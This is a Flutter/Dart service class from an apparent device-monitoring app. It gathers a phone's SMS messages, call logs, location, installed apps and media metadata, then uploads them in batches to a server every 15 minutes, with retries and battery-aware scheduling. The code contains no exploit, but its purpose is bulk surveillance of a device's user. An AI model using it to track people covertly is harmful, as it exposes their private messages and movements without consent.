import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/core/collectors/media_collector.dart';
import 'package:monitored_app/core/services/battery_monitor_service.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';
import 'package:uuid/uuid.dart';
import 'package:monitored_app/app/constants.dart';
import 'package:monitored_app/app/locator.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/collectors/sms_collector.dart';
import 'package:monitored_app/core/collectors/calls_collector.dart';
import 'package:monitored_app/core/collectors/location_collector.dart';
import 'package:monitored_app/core/collectors/apps_collector.dart';
import 'package:monitored_app/core/utils/device_utils.dart';
import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/core/services/battery_optimization_service.dart';
import 'package:monitored_app/core/utils/retry_mechanism.dart';

class DataCollectorService {
  static const Uuid _uuid = Uuid();
  final StorageService _storageService = locator<StorageService>();
  final ApiClient _apiClient = locator<ApiClient>();
  final BatteryOptimizationService _batteryOptimizationService = locator<BatteryOptimizationService>();

  // Collectors
  final SmsCollector _smsCollector = SmsCollector();
  final CallsCollector _callsCollector = CallsCollector();
  final LocationCollector _locationCollector = LocationCollector();
  final AppsCollector _appsCollector = AppsCollector();
  final MediaCollector _mediaCollector = MediaCollector();

  // Public getter for MediaCollector
  MediaCollector get mediaCollector => _mediaCollector;

  // Sync queue
  final Map<String, List<dynamic>> _syncQueue = {};

  // Retry mechanism map
  final Map<String, RetryMechanism> _syncRetryMap = {};

  // Sync timer
  Timer? _syncTimer;
  bool _isSyncing = false;

  // Singleton pattern
  static final DataCollectorService _instance =
      DataCollectorService._internal();
  factory DataCollectorService() => _instance;
  DataCollectorService._internal();

  Future<void> initialize() async {
    // Load any pending data from storage
    await _loadPendingData();

    // Initialize collectors
    await _smsCollector.initialize();
    await _callsCollector.initialize();
    await _locationCollector.initialize();
    await _appsCollector.initialize();
    await _mediaCollector.initialize();
  }

  Future<void> startCollectors() async {
    // Start all collectors
    await _smsCollector.startCollecting();
    await _callsCollector.startCollecting();
    await _locationCollector.startCollecting();
    await _appsCollector.startCollecting();
    await _mediaCollector.startCollecting();

    // Start sync timer (every 15 minutes)
    _syncTimer = Timer.periodic(const Duration(minutes: 15), (_) {
      _syncData();
    });

    // Do an initial sync
    _syncData();
  }

  Future<void> stopCollectors() async {
    // Cancel sync timer
    _syncTimer?.cancel();
    _syncTimer = null;

    // Stop all collectors
    await _smsCollector.stopCollecting();
    await _callsCollector.stopCollecting();
    await _locationCollector.stopCollecting();
    await _appsCollector.stopCollecting();
    await _mediaCollector.stopCollecting();

    // Save any pending data
    await _savePendingData();
  }

  void queueForSync(String dataType, List<dynamic> items) {
    if (items.isEmpty) return;

    // Add items to sync queue
    if (!_syncQueue.containsKey(dataType)) {
      _syncQueue[dataType] = [];
    }

    _syncQueue[dataType]!.addAll(items);

    // Save queue to persistent storage
    _savePendingData();

    // Try to sync immediately if not already syncing
    if (!_isSyncing) {
      _syncData();
    }
  }

  Future<void> _syncData() async {
  if (_isSyncing || _syncQueue.isEmpty) return;

  _isSyncing = true;

  try {
    // Vérifier la connectivité
    final connectivityService = locator<ConnectivityService>();
    final networkStatus = await connectivityService.checkConnectivity();

    if (networkStatus == NetworkStatus.offline) {
      debugPrint('No network connection, skipping sync');
      _isSyncing = false;
      return;
    }

    // Vérifier le niveau de batterie
    final batteryLevel = await locator<BatteryMonitorService>().getCurrentBatteryLevel();

    final deviceId = await DeviceUtils.getDeviceIdentifier();

    // Traiter chaque type de données
    for (final dataType in _syncQueue.keys.toList()) {
      final items = _syncQueue[dataType]!;
      if (items.isEmpty) continue;

      // Vérifier si cette tâche doit s'exécuter selon le niveau de batterie et le mode d'optimisation
      final shouldRun = await _batteryOptimizationService.shouldRunTask(
        _getTaskTypeForDataType(dataType),
        batteryLevel,
      );

      if (!shouldRun) {
        debugPrint('Skipping $dataType sync due to battery optimization settings');
        continue;
      }

      // Limiter la taille du lot
      final batchSize = _getBatchSizeForType(dataType);
      final batch = items.take(batchSize).toList();

      // Générer l'ID de lot
      final batchId = _uuid.v4();

      // Envoyer les données au serveur
      final success = await _sendDataBatchWithRetry(deviceId, dataType, batch, batchId);

      if (success) {
        // Supprimer les éléments synchronisés de la file d'attente
        _syncQueue[dataType]!.removeRange(
          0,
          batch.length > items.length ? items.length : batch.length,
        );

        debugPrint('Synced $dataType batch: ${batch.length} items');
      } else {
        debugPrint('Failed to sync $dataType batch even after retries');
        // Keep items in queue for next sync attempt
      }
    }

    // Enregistrer la file d'attente mise à jour
    await _savePendingData();
  } catch (e) {
    debugPrint('Error syncing data: $e');
  } finally {
    _isSyncing = false;
  }
}

  Future<bool> _sendDataBatch(String deviceId, String dataType,
      List<dynamic> batch, String batchId) async {
    try {
      final response = await _apiClient.post(
        '/devices/$deviceId/offline-data/',
        data: {
          'data_type': dataType,
          'items': batch,
          'batch_id': batchId,
          'device_id': deviceId,
        },
      );

      return response.statusCode == 200 || response.statusCode == 201;
    } catch (e) {
      debugPrint('Error sending data batch: $e');
      return false;
    }
  }

  int _getBatchSizeForType(String dataType) {
    switch (dataType) {
      case 'sms':
        return 50;
      case 'calls':
        return 50;
      case 'location':
        return 100;
      case 'apps':
        return 200;
      default:
        return 50;
    }
  }

  Future<void> _loadPendingData() async {
    try {
      final pendingDataJson = _storageService.getString('pending_data');
      if (pendingDataJson != null) {
        final pendingData = jsonDecode(pendingDataJson) as Map<String, dynamic>;

        for (final entry in pendingData.entries) {
          _syncQueue[entry.key] = List<dynamic>.from(entry.value);
        }

        debugPrint('Loaded pending data: ${_syncQueue.length} types');
      }
    } catch (e) {
      debugPrint('Error loading pending data: $e');
    }
  }

  Future<void> _savePendingData() async {
    try {
      // Remove empty lists
      _syncQueue.removeWhere((key, value) => value.isEmpty);

      // Save to storage
      await _storageService.setString('pending_data', jsonEncode(_syncQueue));
    } catch (e) {
      debugPrint('Error saving pending data: $e');
    }
  }

  // Méthode publique pour déclencher une synchronisation
  Future<void> syncData() async {
    return _syncData();
  }

  // Nouvelle méthode d'envoi avec mécanisme de réessai
  Future<bool> _sendDataBatchWithRetry(String deviceId, String dataType, List<dynamic> batch, String batchId) async {
    // Initialiser ou réinitialiser le mécanisme de réessai pour ce type de données
    if (!_syncRetryMap.containsKey(dataType)) {
      _syncRetryMap[dataType] = RetryMechanism();
    } else {
      _syncRetryMap[dataType]!.reset();
    }
    
    final retryMechanism = _syncRetryMap[dataType]!;
    bool success = false;
    
    do {
      try {
        success = await _sendDataBatch(deviceId, dataType, batch, batchId);
        if (success) return true;
        
        // Attendre avant de réessayer
        if (retryMechanism.canRetry) {
          final delay = retryMechanism.nextDelay;
          debugPrint('Retry sending $dataType batch in ${delay.inMilliseconds}ms');
          await Future.delayed(delay);
        }
      } catch (e) {
        debugPrint('Error sending data batch: $e');
        if (retryMechanism.canRetry) {
          final delay = retryMechanism.nextDelay;
          await Future.delayed(delay);
        } else {
          return false;
        }
      }
    } while (!success && retryMechanism.canRetry);
    
    return success;
  }
  
  // Helper pour déterminer le type de tâche à partir du type de données
  String _getTaskTypeForDataType(String dataType) {
    switch (dataType) {
      case 'location':
        return 'LOCATION';
      case 'sms':
      case 'calls':
        return 'NORMAL';
      case 'media_metadata':
        return 'MEDIA_SYNC';
      case 'app_usage':
        return 'HEAVY_SYNC';
      default:
        return 'NORMAL';
    }
  }
}
